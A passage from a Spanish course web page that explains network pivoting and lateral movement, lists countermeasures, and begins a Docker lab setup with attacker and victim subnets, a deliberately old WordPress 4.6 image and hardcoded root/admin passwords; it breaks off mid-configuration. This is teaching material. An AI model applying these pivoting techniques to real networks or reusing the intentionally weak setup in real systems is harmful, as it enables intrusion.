@@ -1,0 +1,1048 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Pivoting, Docker, movimiento lateral, túnel SSH, proxychains. Pentesting, hacking, AD. Apuntes, teoría, prácticas, ejercicio del curso de especialización de ciberseguridad. IES severo ochoa Elche. Hacking ético. incidentes de seguridad, puesta en producción segura.">
+      
+      
+      
+        <link rel="canonical" href="https://jogonar-rgb.github.io/Ciberseguridad_2025_2026/Seguridad_ofensiva/Pivoting/">
+      
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>Laboratorio de pivoting en Docker - Seguridad en sistemas del curso de especialista en ciberseguridad</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="light-green" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#un-poco-de-teoria" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Seguridad en sistemas del curso de especialista en ciberseguridad" class="md-header__button md-logo" aria-label="Seguridad en sistemas del curso de especialista en ciberseguridad" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Seguridad en sistemas del curso de especialista en ciberseguridad
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Laboratorio de pivoting en Docker
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="light-green" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Pestañas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Introducción
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../warm/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Warm up
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Seguridad en sistemas del curso de especialista en ciberseguridad" class="md-nav__button md-logo" aria-label="Seguridad en sistemas del curso de especialista en ciberseguridad" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Seguridad en sistemas del curso de especialista en ciberseguridad
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introducción
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../warm/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Warm up
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Warm up
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Apuntes_Linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Entornos Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Ejercicios_Linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ejercicios propuestos Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Apuntes_Windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Entornos Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Ejercicios_Windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ejercicios propuestos Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/webgrafia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Webgrafía
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="un-poco-de-teoria">Un poco de teoría</h1>
+<p>En ciberseguridad, el pivoting es una técnica utilizada por atacantes para moverse lateralmente dentro de una red comprometida, utilizando un sistema previamente comprometido como punto de apoyo o "puente" para acceder a otros sistemas o recursos que de otro modo no serían accesibles directamente desde el exterior.</p>
+<p>El pivoting se usa comúnmente después de obtener acceso inicial a una red y es una parte clave en la fase de post-explotación de un ataque. El objetivo principal es maximizar el alcance y obtener más información o acceso a sistemas de alto valor.
+Tipos de Pivoting</p>
+<ul>
+<li>
+<p><strong>Pivoting de red:</strong> Consiste en redirigir el tráfico de una herramienta o servicio hacia una red interna a través de una máquina comprometida. Esto permite al atacante escanear o interactuar con máquinas que solo son accesibles desde la red interna.</p>
+<ul>
+<li><u>Ejemplo:</u> Un atacante compromete un servidor web DMZ que está conectado a una red interna. Desde este servidor, redirige el tráfico a otros servidores internos para realizar reconocimiento o ataques adicionales.</li>
+</ul>
+</li>
+<li>
+<p><strong>Pivoting de archivo/sesión:</strong> Utiliza credenciales o tokens robados en un sistema comprometido para autenticar y moverse a otros sistemas sin necesidad de redireccionar el tráfico de red.</p>
+<ul>
+<li><u>Ejemplo:</u> Un atacante obtiene credenciales válidas en un servidor de base de datos a través de un servidor comprometido y las utiliza para acceder a otros sistemas dentro de la misma red.</li>
+</ul>
+</li>
+</ul>
+<h3 id="ejemplos-practicos">Ejemplos Prácticos</h3>
+<ul>
+<li>
+<p><strong><em>Mediante herramientas de pentesting:</em></strong></p>
+<ul>
+<li><strong>Metasploit:</strong> El atacante usa un exploit para comprometer un sistema, establece un meterpreter session, y configura un proxy o túnel para escanear y atacar otros dispositivos internos.</li>
+<li><strong>ProxyChains:</strong> Se configura un túnel para ejecutar herramientas externas (como nmap o sqlmap) a través del sistema comprometido.</li>
+</ul>
+</li>
+<li>
+<p><strong><em>Ataques de Active Directory:</em></strong> Un atacante compromete un dispositivo de usuario final, roba credenciales y las usa para moverse lateralmente hacia un controlador de dominio u otros servidores críticos.</p>
+</li>
+<li>
+<p><strong><em>VPN y túneles inversos:</em></strong> El atacante establece un túnel SSH o usa herramientas como chisel o frp para crear una conexión desde el sistema comprometido hacia su máquina atacante, permitiéndole acceso continuo a la red interna.</p>
+</li>
+<li>
+<p><strong><em>Ataque a segmentación de red:</em></strong> En una red segmentada, el atacante usa un servidor comprometido como pivote para acceder a otras subredes. Por ejemplo, compromete un servidor en la VLAN de administración y desde allí accede a servidores de producción.</p>
+</li>
+</ul>
+<h2 id="contramedidas-para-evitar-el-pivoting">Contramedidas para Evitar el Pivoting</h2>
+<ul>
+<li>
+<p><strong>Segmentación de red y VLAN:</strong> Asegurar que las subredes estén correctamente segmentadas y que solo los sistemas autorizados puedan comunicarse entre ellas.</p>
+</li>
+<li>
+<p>M<strong>onitorización de tráfico:</strong> Detectar conexiones inusuales desde servidores comprometidos hacia otras partes de la red interna.</p>
+</li>
+<li>
+<p><strong>Políticas de privilegios mínimos:</strong> Asegurarse de que los usuarios y servicios tengan acceso solo a lo estrictamente necesario.</p>
+</li>
+<li>
+<p><strong>Uso de EDR/NDR:</strong> Implementar soluciones que detecten movimientos laterales y actividades de red sospechosas.</p>
+</li>
+<li>
+<p><strong>Parcheo de sistemas:</strong> Mantener los sistemas actualizados para reducir las vulnerabilidades explotables que permiten establecer puntos de pivote.</p>
+</li>
+</ul>
+<h1 id="pivoting">Pivoting</h1>
+<p>El pivoting hace referencia a una técnica donde tras comprometer un equipo, nos damos cuenta de que éste nos da acceso a otros equipos o redes a los que de una forma directa no podríamos acceder. Así pues, nuestra máquina comprometida o máquina de salto nos sirve para seguir obteniendo nuevos accesos.</p>
+<p>De forma esquemática</p>
+<ul>
+<li>"X" tiene acceso a "Y"</li>
+<li>"Y" tiene acceso a "Z"</li>
+<li>"X" no tiene acceso a "Z"</li>
+<li>"X" consigue acceso a "Z" utilizando "Y" cómo máquina de <em>pivoting</em></li>
+</ul>
+<h1 id="descripcion-de-la-practica">Descripción de la práctica</h1>
+<p>Para la realización de esta práctica se montará una infraestructura completa en Docker tal y como muestra la siguiente imagen:</p>
+<p><img alt="" src="../img/pivoting1.png" /></p>
+<p>Tenemos dos contenedores llamados <em>víctima 1</em> y <em>víctima 2</em> ambos en la red <strong>172.16.101.0/24</strong>. El atacante por otra parte en una subred diferente, la <strong>172.16.100.0/24</strong>.</p>
+<p>La máquina <em>helper</em> o <em>gateway</em> tiene dos interfaces, una en cada una de las dos subredes de este escenario.</p>
+<h2 id="explicacion-de-los-archivos-de-docker-compose">Explicación de los archivos de docker compose</h2>
+<p>En primer lugar, tenemos un archivo <code>docker-compose-subnet.yml</code> cuyo fin único es la creación de las subredes que vamos a necesitar y que hemos nombrado anteriormente.</p>
+<div class="highlight"><pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;3.8&quot;</span>
+
+<span class="nt">networks</span><span class="p">:</span>
+<span class="hll"><span class="w">  </span><span class="nt">attacker</span><span class="p">:</span>
+</span><span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bridge</span>
+<span class="w">    </span><span class="nt">ipam</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">default</span>
+<span class="w">      </span><span class="nt">config</span><span class="p">:</span>
+<span class="hll"><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">subnet</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.100.0/24</span>
+</span><span class="hll"><span class="w">          </span><span class="nt">gateway</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.100.2</span>
+</span>
+<span class="hll"><span class="w">  </span><span class="nt">victim</span><span class="p">:</span>
+</span><span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bridge</span>
+<span class="w">    </span><span class="nt">ipam</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">default</span>
+<span class="w">      </span><span class="nt">config</span><span class="p">:</span>
+<span class="hll"><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">subnet</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.101.0/24</span>
+</span><span class="hll"><span class="w">          </span><span class="nt">gateway</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.101.3</span>
+</span></code></pre></div>
+<p>La sección <code>ipam</code> es un acrónimo de <strong>IP Address Management</strong> y es dónde indicamos las direcciones de red así como las puertas de enlace. Para este escenario el driver por defecto (bridge) es suficiente. </p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>Si tenéis interés en saber los drivers de red que pueden existir y cuándo se usan, podéis leer <a href="https://www.docker.com/blog/understanding-docker-networking-drivers-use-cases/">aquí</a> o un pequeño resumen <a href="https://docs.docker.com/network/drivers/#network-driver-summary">aquí</a></p>
+</div>
+<p>Luego tenemos un <code>docker-compose.yml</code> para construir los contenedores que vamos a utilizar:</p>
+<p><div class="highlight"><pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;3.8&quot;</span>
+
+<span class="nt">services</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">attacker</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">build</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./dockerfiles</span>
+<span class="w">      </span><span class="nt">dockerfile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">attacker.Dockerfile</span>
+<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">attacker</span>
+<span class="w">    </span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">attacker</span>
+<span class="w">    </span><span class="nt">extra_hosts</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;helper:172.16.100.11&quot;</span>
+<span class="w">    </span><span class="nt">links</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">helper</span>
+<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">attacker</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.100.10</span>
+
+<span class="hll"><span class="w">  </span><span class="nt">helper</span><span class="p">:</span>
+</span><span class="hll"><span class="w">    </span><span class="nt">build</span><span class="p">:</span>
+</span><span class="hll"><span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./dockerfiles</span>
+</span><span class="hll"><span class="w">      </span><span class="nt">dockerfile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">helper.Dockerfile</span>
+</span><span class="hll"><span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">helper</span>
+</span><span class="hll"><span class="w">    </span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">helper</span>
+</span><span class="hll"><span class="w">    </span><span class="nt">extra_hosts</span><span class="p">:</span>
+</span><span class="hll"><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;victim1:172.16.101.20&quot;</span>
+</span><span class="hll"><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;victim2:172.16.101.21&quot;</span>
+</span><span class="hll"><span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
+</span><span class="hll"><span class="w">      </span><span class="nt">attacker</span><span class="p">:</span>
+</span><span class="hll"><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.100.11</span>
+</span><span class="hll"><span class="w">      </span><span class="nt">victim</span><span class="p">:</span>
+</span><span class="hll"><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.101.11</span>
+</span>
+<span class="w">  </span><span class="nt">victim1</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">build</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./dockerfiles</span>
+<span class="w">      </span><span class="nt">dockerfile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">victim1.Dockerfile</span>
+<span class="w">    </span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">victim1</span>
+<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">victim1</span>
+<span class="w">    </span><span class="nt">extra_hosts</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;helper:172.16.101.11&quot;</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;victim2:172.16.101.21&quot;</span>
+<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">victim</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.101.20</span>
+
+<span class="w">  </span><span class="nt">victim2</span><span class="p">:</span>
+<span class="w">     </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">vulhub/wordpress:4.6</span>
+<span class="w">     </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">victim2</span>
+<span class="w">     </span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">victim2</span>
+<span class="w">     </span><span class="nt">depends_on</span><span class="p">:</span>
+<span class="w">       </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mysql</span>
+<span class="w">     </span><span class="nt">environment</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WORDPRESS_DB_HOST=172.16.101.22:3306</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WORDPRESS_DB_USER=root</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WORDPRESS_DB_PASSWORD=root</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WORDPRESS_DB_NAME=wordpress</span>
+<span class="w">     </span><span class="nt">ports</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;8080:80&quot;</span>
+<span class="w">     </span><span class="nt">extra_hosts</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;helper:172.16.101.11&quot;</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;victim1:172.16.101.20&quot;</span>
+<span class="w">     </span><span class="nt">networks</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">victim</span><span class="p">:</span>
+<span class="w">          </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.101.21</span>
+<span class="w">     </span><span class="nt">volumes</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">wp_vol:/var/www/html</span>
+
+<span class="w">  </span><span class="nt">mysql</span><span class="p">:</span>
+<span class="w">     </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mysql:5</span>
+<span class="w">     </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">victim2_mysql</span>
+<span class="w">     </span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">victim2sql</span>
+<span class="w">     </span><span class="nt">environment</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MYSQL_ROOT_PASSWORD=root</span>
+<span class="w">     </span><span class="nt">networks</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">victim</span><span class="p">:</span>
+<span class="w">          </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">172.16.101.22</span>
+
+<span class="w">  </span><span class="nt">wp-cli</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">forumone/wordpress-cli:7.1-cli2.3.0</span>
+<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mysql</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">victim2</span>
+<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">wp_vol:/var/www/html</span>
+<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">victim</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">      </span><span class="no">/bin/sh -c &#39;</span>
+<span class="w">      </span><span class="no">sleep 10;</span>
+<span class="w">      </span><span class="no">wp core install --path=&quot;/var/www/html&quot; --url=&quot;http://172.16.101.21&quot; --title=&quot;Pivot Your Way&quot; --admin_user=admin --admin_password=adminpass --admin_email=admin@admin.com --allow-root</span>
+<span class="w">      </span><span class="no">&#39;</span>
+
+<span class="nt">volumes</span><span class="p">:</span>
